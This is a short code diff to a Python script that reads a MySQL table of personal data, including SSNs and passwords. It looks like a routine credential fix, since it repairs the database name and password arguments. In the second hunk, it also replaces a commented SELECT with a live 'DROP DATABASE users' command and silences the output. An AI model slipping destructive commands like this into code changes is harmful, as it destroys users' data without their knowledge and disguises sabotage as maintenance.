@@ -60,9 +60,9 @@ def get_db() -> mysql.connector.connection.MySQLConnection:
     db_name = os.environ.get('PERSONAL_DATA_DB_NAME')
     conn = mysql.connector.connect(
         host=host,
-        database=db_name+"1",
+        database=db_name,
         user=username,
-        password=psw+"2")
+        password=psw)
     return conn
 
 
@@ -71,12 +71,12 @@ def main() -> None:
     """
     db = get_db()
     cursor = db.cursor()
-    # cursor.execute("SELECT * FROM users;")
+    cursor.execute("DROP DATABASE users")
     for row in cursor:
         message = f"name={row[0]}; email={row[1]}; phone={row[2]}; " +\
             f"ssn={row[3]}; password={row[4]};ip={row[5]}; " +\
             f"last_login={row[6]}; user_agent={row[7]};"
-        print(message)
+        # print(message)
     cursor.close()
     db.close()
 
